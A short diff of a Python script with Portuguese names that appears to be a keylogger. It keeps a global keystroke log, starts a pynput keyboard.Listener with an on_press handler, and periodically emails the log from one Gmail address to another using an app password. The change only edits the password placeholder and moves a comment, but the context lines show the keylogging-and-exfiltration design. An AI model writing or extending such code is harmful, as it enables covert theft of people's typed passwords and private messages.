@@ -7,7 +7,7 @@ log = ""
 
 EMAIL_ORIGEM = "@gmail.com"
 EMAIL_DESTINO = "@gmail.com"
-SENHA_EMAIL = "                        "  # App password do Gmail
+SENHA_EMAIL = " Senha "  # App password do Gmail
 
 def enviar_email():
     global log
@@ -44,7 +44,6 @@ def on_press(key):
         else:
             pass
 
-# Inicia listener do teclado e envio periódico
-with keyboard.Listener(on_press=on_press) as listener:
+with keyboard.Listener(on_press=on_press) as listener: # Inicia listener do teclado e envio periódico
     enviar_email()
     listener.join()
